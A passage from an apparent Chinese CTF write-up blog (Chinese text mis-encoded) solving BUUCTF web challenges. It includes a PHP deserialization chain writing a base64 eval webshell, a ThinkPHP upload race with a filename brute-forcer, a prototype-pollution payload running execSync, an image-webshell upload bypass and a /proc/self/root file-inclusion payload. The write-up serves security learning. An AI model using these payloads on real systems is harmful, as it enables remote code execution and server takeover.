3ä¸ªaæ˜¯ä¸ºäº†è¡¥é½base64å­—èŠ‚æ•°</span><span class="hljs-keyword">echo</span> $data; <span class="hljs-comment">//aaaPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=</span>$filename = <span class="hljs-string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/shell.php&#x27;</span>;$data = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, $expire) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . $data;$result = file_put_contents($filename, $data);<span class="hljs-keyword">echo</span> $result;</code></pre><p>è¿™æ®µä»£ç ä¸­çš„$dataå…¨éƒ¨ç”¨base64è§£ç è½¬åŒ–è¿‡åå†å†™å…¥æ–‡ä»¶ä¸­ï¼Œå…¶ä¸­å‰é¢æ‹¼æ¥éƒ¨åˆ†ä¼šè¢«å¼ºåˆ¶è§£ç ï¼Œä»è€Œå˜æˆä¸€å †ä¹±ç ã€‚è€Œæˆ‘ä»¬å†™å…¥çš„shellï¼ˆbase64ç¼–ç è¿‡çš„ï¼‰ä¼šè§£ç æˆæ­£å¸¸çš„æœ¨é©¬æ–‡ä»¶ã€‚éœ€è¦æ³¨æ„çš„æ˜¯é•¿åº¦é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦shelléƒ¨åˆ†å’Œå‰é¢åŠ èµ·æ¥çš„å­—èŠ‚æ•°ä¸º4çš„å€æ•°(base64è§£ç æ—¶ä¸å½±å“shelléƒ¨åˆ†)ã€‚</p><p>ç„¶åçœ‹ä¸€ä¸‹Aç±»</p><p>ä¸€æ ·ä»<code>__destruct()</code>çœ‹èµ·</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;autosave) &#123; <span class="hljs-comment">//æ­¤å¤„ä»¤autosave=falseå³å¯è¿›å…¥è¿›å…¥save()å‡½æ•°</span>            <span class="hljs-keyword">$this</span>-&gt;save();        &#125;    &#125;</code></pre><p>==&gt;</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;        $contents = <span class="hljs-keyword">$this</span>-&gt;getForStorage();        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, $contents, <span class="hljs-keyword">$this</span>-&gt;expire); <span class="hljs-comment">//Aç±»ä¸­ä¸å­˜åœ¨set()å‡½æ•°ï¼Œè€ŒBç±»å­˜åœ¨ï¼Œæ­¤å¤„ä¸ºpopé“¾è¿æ¥ç‚¹ï¼Œå¯ä»¤store=new B()</span>    &#125;</code></pre><p>==&gt;</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $contents</span>) </span>&#123; <span class="hljs-comment">//è¿™é‡Œå¯ä»¤ä¼ å…¥çš„arrayä¸ºç©ºï¼Œåˆ™æœ€åreturnçš„contentsä¸ºç©º</span>        $cachedProperties = array_flip([            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,        ]);        <span class="hljs-keyword">foreach</span> ($contents <span class="hljs-keyword">as</span> $path =&gt; $object) &#123;            <span class="hljs-keyword">if</span> (is_array($object)) &#123;                $contents[$path] = array_intersect_key($object, $cachedProperties); <span class="hljs-comment">//æ¯”è¾ƒä¸¤ä¸ªæ•°ç»„çš„é”®åï¼Œå¹¶è¿”å›äº¤é›†</span>            &#125;        &#125;        <span class="hljs-keyword">return</span> $contents;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;        $cleaned = <span class="hljs-keyword">$this</span>-&gt;cleanContents(<span class="hljs-keyword">$this</span>-&gt;cache);        <span class="hljs-keyword">return</span> json_encode([$cleaned, <span class="hljs-keyword">$this</span>-&gt;complete]); <span class="hljs-comment">//jsonç¼–ç </span>        <span class="hljs-comment">//æ­¤å¤„returnçš„complete -&gt; Aç±»çš„set(,$contents,)-&gt;Bç±» set(,$value,) -&gt;$data = $this-&gt;serialize($value);</span>        <span class="hljs-comment">//å³completeçš„å†…å®¹åº”ä¸ºwebshellçš„å†…å®¹ï¼Œjson_encodeå‡ºæ¥çš„ä¸­æ‹¬å·[]ç­‰å­—ç¬¦ï¼Œä¸åœ¨base64ç¼–ç è¡¨å†…ï¼Œbase6è§£ç å†™å…¥webshellçš„æ—¶å€™ä¼šè‡ªåŠ¨å»é™¤</span>    &#125;</code></pre><p>payload</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">protected</span> $store;    <span class="hljs-keyword">protected</span> $key;    <span class="hljs-keyword">protected</span> $expire;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;store = <span class="hljs-keyword">new</span> B();        <span class="hljs-keyword">$this</span>-&gt;key = <span class="hljs-string">&#x27;&#x27;</span>;        <span class="hljs-keyword">$this</span>-&gt;expire = <span class="hljs-number">0</span>;        <span class="hljs-keyword">$this</span>-&gt;autosave = <span class="hljs-literal">false</span>;        <span class="hljs-keyword">$this</span>-&gt;cache = [];        <span class="hljs-keyword">$this</span>-&gt;complete = <span class="hljs-string">&#x27;aaaPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&#x27;</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;writeTimes = <span class="hljs-number">0</span>;        <span class="hljs-keyword">$this</span>-&gt;options = <span class="hljs-keyword">array</span>( <span class="hljs-string">&#x27;data_compress&#x27;</span> =&gt; <span class="hljs-literal">false</span>,                                <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;php://filter/write=convert.base64-decode/resource=uploads/shell.php&#x27;</span>,                                <span class="hljs-string">&#x27;serialize&#x27;</span> =&gt; <span class="hljs-string">&#x27;strval&#x27;</span>); <span class="hljs-comment">//strvalåŠ äº†ç›¸å½“äºä¸åŠ ï¼Œåªæ˜¯ä¸ºäº†ç”¨åˆ°serialize</span>    &#125;&#125;<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">new</span> A));<span class="hljs-meta">?&gt;</span></code></pre><p>ä¼ å…¥æ•°æ®åèšå‰‘è¿æ¥å³å¯ï¼š</p><p><img src="/2021/08/20/hjs/4.png" alt="4"></p><h1>[RoarCTF 2019]Simple Upload</h1><p>çŸ¥è¯†ç‚¹ï¼š</p><ul><li>Thinkphpé”™è¯¯ä½¿ç”¨Uploadç±»å¯¼è‡´getshell</li></ul><p>ä»æºç å¯ä»¥çœ‹å‡ºå®ƒä½¿ç”¨äº†<a href="https://www.chabug.org/tags/thinkphp">thinkphp</a>ï¼Œæ€»ç»“å‡ ç‚¹æœ‰ç”¨ä¿¡æ¯ï¼š</p><blockquote><p>Think PHPä¸Šä¼ é»˜è®¤è·¯å¾„æ˜¯/home/index/upload</p></blockquote><blockquote><p>Think PHP upload()å¤šæ–‡ä»¶ä¸Šä¼ <br>think PHPé‡Œçš„upload()å‡½æ•°åœ¨ä¸ä¼ å‚çš„æƒ…å†µä¸‹æ˜¯æ‰¹é‡ä¸Šä¼ çš„ï¼Œå¯ä»¥ç†è§£ä¸ºé˜²æŠ¤æœºåˆ¶åªä¼šæ£€æµ‹ä¸€æ¬¡ï¼Œè¿ç”¨æ¡ä»¶ç«äº‰ï¼Œå¤šæ¬¡ä¸Šä¼ ä¾¿å¯ä»¥ç»•è¿‡æ–‡ä»¶åç¼€çš„æ£€æµ‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸¤æ¬¡1.txt,è·å–phpæ–‡ä»¶çš„åç¼€ï¼Œå› ä¸ºè¿™é‡Œçš„åç¼€å‘½åæ–¹å¼è¿ç”¨äº†<strong>uniqidå‡½æ•°</strong>å®ƒæ˜¯åŸºäºå¾®ç§’çš„å½“å‰æ—¶é—´æ¥æ›´æ”¹æ–‡ä»¶åçš„ï¼Œä¸¤ä¸ªåŒæ—¶ä¸Šä¼ ç”Ÿæˆçš„æ–‡ä»¶åç›¸å·®ä¸ä¼šå¤ªè¿œã€‚</p></blockquote><blockquote><p>ThinkPHP ä¸Šä¼ æ–‡ä»¶åçˆ†ç ´<br>å…ˆä¸Šä¼ ä¸€ä¸ªæ­£å¸¸æ–‡ä»¶å†ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶ï¼Œç„¶åå†ä¸Šä¼ ä¸€ä¸ªæ­£å¸¸æ–‡ä»¶ï¼Œç„¶åæ ¹æ®ç¬¬ä¸€å’Œç¬¬ä¸‰ä¸ªæ­£å¸¸æ–‡ä»¶çš„æ–‡ä»¶åä¹‹é—´çš„å·®å¼‚ï¼Œçˆ†ç ´å‡ºæˆ‘ä»¬ä¸Šä¼ çš„æœ¨é©¬æ–‡ä»¶</p></blockquote><blockquote><p><strong>$upload-&gt;allowExts</strong> å¹¶ä¸æ˜¯ <strong>Think\Upload</strong> ç±»çš„æ­£ç¡®ç”¨æ³•ï¼Œæ‰€ä»¥ <strong>allowexts</strong> åç¼€åé™åˆ¶æ— æ•ˆã€‚</p></blockquote><p>å…ˆæµ‹è¯•ä¸¤ä¸ªtxtæ–‡ä»¶åæ˜¯æœ‰å‡ ä½æ•°ä¸åŒï¼š</p><p><img src="/2021/08/20/hjs/3.png" alt="3"></p><p>è„šæœ¬ï¼š</p><pre><code class="hljs apache"><span class="hljs-attribute">import</span> requests<span class="hljs-attribute">url</span> = &#x27;http://c<span class="hljs-number">8125</span>b<span class="hljs-number">29</span>-<span class="hljs-number">7862</span>-<span class="hljs-number">46</span>f<span class="hljs-number">5</span>-<span class="hljs-number">9628</span>-<span class="hljs-number">9</span>cb<span class="hljs-number">43</span>a<span class="hljs-number">8</span>f<span class="hljs-number">2</span>c<span class="hljs-number">51</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/index.php/Home/Index/upload&#x27;<span class="hljs-attribute">file1</span> = &#123;&#x27;file&#x27;:open(&#x27;<span class="hljs-number">1</span>.txt&#x27;,&#x27;r&#x27;)&#125;<span class="hljs-attribute">file2</span> = &#123;&#x27;file[]&#x27;:open(&#x27;<span class="hljs-number">1</span>.php&#x27;,&#x27;r&#x27;)&#125; <span class="hljs-attribute">r</span> = requests.post(url,files = file<span class="hljs-number">1</span>)<span class="hljs-attribute">print</span> (r.text)<span class="hljs-attribute">r</span> = requests.post(url,files = file<span class="hljs-number">2</span>)<span class="hljs-attribute">print</span> (r.text)<span class="hljs-attribute">r</span> = requests.post(url, files = file<span class="hljs-number">1</span>)<span class="hljs-attribute">print</span> (r.text)</code></pre><p>æœ‰5ä½ä¸åŒï¼Œç”¨è„šæœ¬çˆ†ç ´</p><pre><code class="hljs apache"><span class="hljs-attribute">dir</span>=&#x27;abcdefghijklmnopqrstuvwxyz<span class="hljs-number">0123456789</span>&#x27;<span class="hljs-attribute">for</span> i in dir:    <span class="hljs-attribute">for</span> j in dir:        <span class="hljs-attribute">for</span> x in dir:            <span class="hljs-attribute">for</span> y in dir:                <span class="hljs-attribute">for</span> z in dir:                    <span class="hljs-attribute">url</span>=&#x27;http://<span class="hljs-number">42</span>ce<span class="hljs-number">58</span>e<span class="hljs-number">8</span>-bbfa-<span class="hljs-number">427</span>d-b<span class="hljs-number">9</span>c<span class="hljs-number">2</span>-c<span class="hljs-number">732</span>b<span class="hljs-number">517</span>a<span class="hljs-number">827</span>.node<span class="hljs-number">3</span>.buuoj.cn/Public/Uploads/<span class="hljs-number">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">04</span>/<span class="hljs-number">5</span>fc<span class="hljs-number">9</span>da<span class="hljs-number">34</span>&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;.txt&#x27;.format(i,j,x,y,z)                    <span class="hljs-attribute">r</span> = requests.get(url)                    <span class="hljs-attribute">print</span>(url)                    <span class="hljs-attribute">if</span> r.status_code== <span class="hljs-number">200</span>:                        <span class="hljs-attribute">print</span>(url)                        <span class="hljs-attribute">break</span></code></pre><p>æˆ–è€…bpçˆ†ç ´ä¹Ÿè¡Œï¼Œå¾—åˆ°æ­£ç¡®è·¯å¾„åè®¿é—®ï¼š</p><p><img src="/2021/08/20/hjs/2.png" alt="2"></p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/zhwyyswdg/p/14086311.html">https://www.cnblogs.com/zhwyyswdg/p/14086311.html</a></p>]]></content>
    
    
    <categories>
      
      <category>jsåŸé“¾æ±¡æŸ“</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>buuï¼ˆä¹ï¼‰</title>
    <link href="/2021/08/19/me/"/>
    <url>/2021/08/19/me/</url>
    
    <content type="html"><![CDATA[<h1>[GYCTF2020]Ez_Express</h1><p>é¢˜ç›®è¦æ±‚adminç™»å½•ï¼Œæ‰«ç›®å½•å¾—åˆ°æºç ï¼š</p><img src="/2021/08/19/me/1.png" alt="1" style="zoom:67%;"><p>åœ¨è·¯ç”±é‡Œå‘ç°äº†<code>merge()</code>å’Œ<code>clone()</code>ï¼Œå…¸å‹çš„åŸé“¾æ±¡æŸ“å¼€ç«¯ï¼Œä¹‹å‰å­¦è¿‡ï¼š<a href="https://liquor-boop.github.io/2021/04/18/js/">jsåŸå‹é“¾æ±¡æŸ“</a>ä¸»è¦æ˜¯åˆ©ç”¨ç‚¹ï¼šæ§åˆ¶å¹¶ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚</p><p>å¾€ä¸‹åœ¨<code>/action</code>çš„è·¯ç”±ä¸­æ‰¾åˆ°<code>clone()</code>ï¼š</p><p><img src="/2021/08/19/me/2.png" alt="2"></p><p>ç”¨æˆ·èº«ä»½å¿…é¡»ä¸ºadminï¼Œè·Ÿè¿›ç™»å½•è·¯ç”±</p><p><img src="/2021/08/19/me/3.png" alt="3"></p><p>ä¼ å…¥çš„useridç»è¿‡äº†<code>safeKeyword</code>å‡½æ•°ï¼š</p><pre><code class="hljs arcade"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safeKeyword</span>(<span class="hljs-params">keyword</span>) </span>&#123;  <span class="hljs-keyword">if</span>(keyword.match(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;      <span class="hljs-keyword">return</span> keyword  &#125;</code></pre><p>é€šè¿‡æ­£åˆ™æ¥è¿‡æ»¤æ‰admin(å¤§å°å†™)ï¼Œä¸è¿‡å‰é¢æœ‰ä¸€å¤„ï¼š<code>'user':req.body.userid.toUpperCase()</code>å°†userè½¬ä¸ºå¤§å†™ï¼Œè½¬ç¼–ç ä¸€èˆ¬ä¼šå‡ºé—®é¢˜ï¼š</p><blockquote><h5 id="toUpperCase"><a class="header-anchor" href="#toUpperCase">ğŸ­</a>toUpperCase()</h5><p>å…¶ä¸­æ··å…¥äº†ä¸¤ä¸ªå¥‡ç‰¹çš„å­—ç¬¦&quot;Ä±&quot;ã€â€œÅ¿â€ã€‚</p><p>è¿™ä¸¤ä¸ªå­—ç¬¦çš„â€œå¤§å†™â€æ˜¯Iå’ŒSã€‚ä¹Ÿå°±æ˜¯è¯´&quot;Ä±&quot;.toUpperCase() == â€˜Iâ€™ï¼Œâ€œÅ¿â€.toUpperCase() == â€˜Sâ€™ã€‚é€šè¿‡è¿™ä¸ªå°ç‰¹æ€§å¯ä»¥ç»•è¿‡ä¸€äº›é™åˆ¶ã€‚</p><h5 id="toLowerCase"><a class="header-anchor" href="#toLowerCase">ğŸ­</a>toLowerCase()</h5><p>è¿™ä¸ª&quot;â„ª&quot;çš„â€œå°å†™â€å­—ç¬¦æ˜¯kï¼Œä¹Ÿå°±æ˜¯&quot;â„ª&quot;.toLowerCase() == â€˜kâ€™.</p><p>è¯¦è§<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">javascriptå¤§å°å†™ç‰¹æ€§</a></p></blockquote><p>æ•…ç”¨<code>admÄ±n</code>æ³¨å†Œå³å¯ï¼Œadminç™»å½•åï¼Œå¼€å§‹æ‰¾åŸå‹é“¾æ±¡æŸ“çš„å‚æ•°ï¼Œ</p><p><img src="/2021/08/19/me/4.png" alt="4"></p><p><code>/info</code>è·¯ç”±ä¸‹ï¼Œå°†<code>outputFunctionName</code>æ¸²æŸ“å…¥<code>index</code>ä¸­ï¼Œè€Œ<code>outputFunctionName</code>å¹¶æ²¡æœ‰å®šä¹‰ï¼Œ</p><p><img src="/2021/08/19/me/5.png" alt="5"></p><p>é‚£å°±å¯ä»¥é€šè¿‡æ±¡æŸ“<code>outputFunctionName</code>è¿›è¡ŒSSTIï¼ŒæŠ“<code>/action</code>çš„åŒ…ï¼ˆcloneä»/actionè·¯ç”±å¼€å§‹ï¼‰ï¼Œ<code>Content-Type</code>è®¾ä¸º<code>application/json</code></p><p>payload</p><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;lua&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;</span>&#125;,<span class="hljs-attr">&quot;Submit&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;</code></pre><p>å³å¯åœ¨/infoè·¯ç”±ä¸‹è½½åˆ°flag</p><p>å‚è€ƒï¼š<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p><p><a href="https://www.cnblogs.com/LEOGG321/p/13448463.html">https://www.cnblogs.com/LEOGG321/p/13448463.html</a></p><h1>[CISCN2021 Quals]upload</h1><h4 id="åˆ†æ"><a class="header-anchor" href="#åˆ†æ">ğŸ­</a>åˆ†æ</h4><p>é¢˜ç›®ç»™äº†index.phpï¼Œå¯¹ä¸Šä¼ æ–‡ä»¶åšäº†å¦‚ä¸‹é™åˆ¶ï¼š</p><ul><li><p>å›¾ç‰‡çš„é•¿å®½å¿…é¡»ä¸º1</p><p>ä½¿ç”¨XMBå¤´ç»•è¿‡</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> test_width 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> test_height 1</span></code></pre></li><li><p><code>getimagesize</code></p></li><li><p>æ–‡ä»¶åä¸èƒ½æœ‰cã€iã€h</p><p>å¹³å¸¸ç”¨çš„.htaccess çš„hè¢«è¿‡æ»¤ï¼Œ.use.ini çš„iè¢«è¿‡æ»¤</p></li></ul><p>éƒ¨åˆ†å­—æ¯åœ¨ç»è¿‡<code>mb_strtolower</code>å¤„ç†è¿‡å¯ä»¥ç­‰æ•ˆæ™®é€šå­—æ¯</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>var_dump(mb_strtolower(<span class="hljs-string">&#x27;Ä°&#x27;</span>)===<span class="hljs-string">&#x27;i&#x27;</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-comment">#ç»“æœä¸ºtrue</span>å‰é¢è¿˜è¿›è¡Œäº†urlè§£å¯†ï¼Œæ•…å¯ç”¨%c4%b0ä»£æ›¿<span class="hljs-string">&#x27;Ä°&#x27;</span>å­—ç¬¦</code></pre><p>ä½†è¿˜æ˜¯æ²¡æœ‰ç›¸å…³å­—æ¯å¯ä»¥ä»£æ›¿phpï¼›æ‰«ç›®å½•ï¼Œå‘ç°example.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>])) &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>]))    $ctf = $_GET[<span class="hljs-string">&quot;ctf&quot;</span>];<span class="hljs-keyword">if</span>($ctf==<span class="hljs-string">&quot;poc&quot;</span>) &#123;    $zip = <span class="hljs-keyword">new</span> \ZipArchive();    $name_for_zip = <span class="hljs-string">&quot;example/&quot;</span> . $_POST[<span class="hljs-string">&quot;file&quot;</span>];    <span class="hljs-keyword">if</span>(explode(<span class="hljs-string">&quot;.&quot;</span>,$name_for_zip)[count(explode(<span class="hljs-string">&quot;.&quot;</span>,$name_for_zip))<span class="hljs-number">-1</span>]!==<span class="hljs-string">&quot;zip&quot;</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> ($zip-&gt;open($name_for_zip) !== <span class="hljs-literal">TRUE</span>) &#123;        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;éƒ½ä¸èƒ½è§£å‹å‘¢&quot;</span>);    &#125;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ&quot;</span>;    $pos_for_zip = <span class="hljs-string">&quot;/tmp/example/&quot;</span> . md5($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);    $zip-&gt;extractTo($pos_for_zip);    $zip-&gt;close();    unlink($name_for_zip);    $files = glob(<span class="hljs-string">&quot;<span class="hljs-subst">$pos_for_zip</span>/*&quot;</span>);    <span class="hljs-keyword">foreach</span>($files <span class="hljs-keyword">as</span> $file)&#123;        <span class="hljs-keyword">if</span> (is_dir($file)) &#123;            <span class="hljs-keyword">continue</span>;        &#125;        $first = imagecreatefrompng($file);        $size = min(imagesx($first), imagesy($first));        $second = imagecrop($first, [<span class="hljs-string">&#x27;x&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;y&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;width&#x27;</span> =&gt; $size, <span class="hljs-string">&#x27;height&#x27;</span> =&gt; $size]);        <span class="hljs-keyword">if</span> ($second !== <span class="hljs-literal">FALSE</span>) &#123;            $final_name = pathinfo($file)[<span class="hljs-string">&quot;basename&quot;</span>];            imagepng($second, <span class="hljs-string">&#x27;example/&#x27;</span>.$final_name);            imagedestroy($second);        &#125;        imagedestroy($first);        unlink($file);    &#125;&#125;</code></pre><p>æˆ‘ä»¬éœ€è¦ä¸Šä¼ <code>zip</code>ï¼Œç„¶åé€šè¿‡è¿™ä¸ªç¨‹åºè§£å‹,æˆ‘ä»¬å·²ç»çŸ¥é“<code>i</code>çš„ç»•è¿‡æ–¹æ³•ï¼Œè¿˜éœ€è¦ç»•è¿‡<code>imagecreatefrompng</code>,<code>imagepng</code>å¦‚æœç›´æ¥åœ¨å›¾ç‰‡æœ€åå†™ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œä¼šè¢«GDåº“ç»™å»æ‰ï¼Œæˆ‘ä»¬éœ€è¦ç”¨è„šæœ¬æ„é€ å›¾ç‰‡é©¬ï¼ˆç±»ä¼¼äºŒæ¬¡æ¸²æŸ“çš„æ“ä½œï¼‰ï¼Œ<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">è„šæœ¬</a></p><h4 id="è§£é¢˜"><a class="header-anchor" href="#è§£é¢˜">ğŸ­</a>è§£é¢˜</h4><p>ç”Ÿæˆå›¾ç‰‡é©¬</p><p><img src="/2021/08/19/me/6.png" alt="6"></p><p>å°†å›¾ç‰‡å¤´å‹å…¥å‹ç¼©åŒ…ã€‚å…ˆå°†æ–‡ä»¶å¤´å†™è¿›æ–‡æœ¬ï¼Œ<em>è¦åŠ ä¸€è¡Œæ¢è¡Œ</em>ï¼Œå› ä¸ºåé¢éœ€è¦è§£å‹ï¼Œè¿™ä¸ªæ–‡ä»¶å¤´éœ€è¦æ”¾åˆ°å‹ç¼©åŒ…åé¢ã€‚</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> test_width 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> test_height 1</span></code></pre><p>åˆå¹¶ï¼š</p><p><img src="/2021/08/19/me/10.png" alt="10"></p><p>ä¸Šä¼ </p><p><img src="/2021/08/19/me/7.png" alt="7"></p><p>è§£å‹</p><p><img src="/2021/08/19/me/19.png" alt="19"></p><p>ä¼šè§£å‹åˆ°/example,èšå‰‘è¿æ¥</p><p><img src="/2021/08/19/me/8.png" alt="8"></p><p>å‚è€ƒï¼š<a href="https://www.plasf.cn/">https://www.plasf.cn/</a></p><h1>[WMCTF2020]Make PHP Great Again</h1><p>æºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;  <span class="hljs-keyword">require_once</span> $_GET[<span class="hljs-string">&#x27;file&#x27;</span>];&#125;</code></pre><h4 id="æ³•ä¸€"><a class="header-anchor" href="#æ³•ä¸€">ğŸ­</a>æ³•ä¸€</h4><blockquote><p>require_onceåŒ…å«çš„è½¯é“¾æ¥å±‚æ•°è¾ƒå¤šæ—¶onceçš„hashåŒ¹é…ä¼šç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«</p><p>è¯¦è§ï¼š<a href="https://www.anquanke.com/post/id/213235#h3-2">æ–‡ç« </a></p></blockquote><p>payload</p><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/root/</span>proc<span class="hljs-regexp">/self/</span>root<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php</code></pre><h4 id="æ³•äºŒ"><a class="header-anchor" href="#æ³•äºŒ">ğŸ­</a>æ³•äºŒ</h4><p>åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«</p><p>åœ¨PHP&gt;5.4ï¼Œsession.upload_progress.enabledè¿™ä¸ªå‚æ•°åœ¨php.iniä¸­é»˜è®¤å¼€å¯ï¼Œåœ¨ä¸Šä¼ çš„è¿‡ç¨‹ä¸­ä¼šç”Ÿæˆä¸Šä¼ è¿›åº¦æ–‡ä»¶ï¼ŒPHPå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ 